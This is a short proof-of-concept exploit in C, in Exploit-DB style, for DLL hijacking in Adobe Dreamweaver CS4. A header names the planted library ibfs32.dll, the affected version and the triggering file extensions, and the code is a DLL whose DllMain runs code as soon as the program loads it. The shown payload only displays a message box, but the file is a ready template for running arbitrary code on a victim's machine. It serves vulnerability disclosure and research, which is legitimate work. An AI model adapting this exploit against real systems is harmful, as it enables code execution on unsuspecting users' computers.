/* 
Exploit Title: Adobe Dreamweaver CS4 DLL Hijacking Exploit (ibfs32.dll)
Date: August 25, 2010
Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
Version: 10.0 Build 4117
Tested on: Windows 7 Ultimate x86
Vulnerable extensions: .asp .asa. aspx .php .php5 .cfm .tpl .asr .jsp (etc)
Greetz: Astalavista, OffSEC, Exploit-DB
*/

#include <windows.h>
#define DllExport __declspec (dllexport)

BOOL WINAPI  DllMain (
            HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
{
  dll_hijack();
  return 0;
}

int dll_hijack()
{
  MessageBox(0, "Dreamweaver DLL Hijacking!", "DLL Message", MB_OK);
  return 0;
}
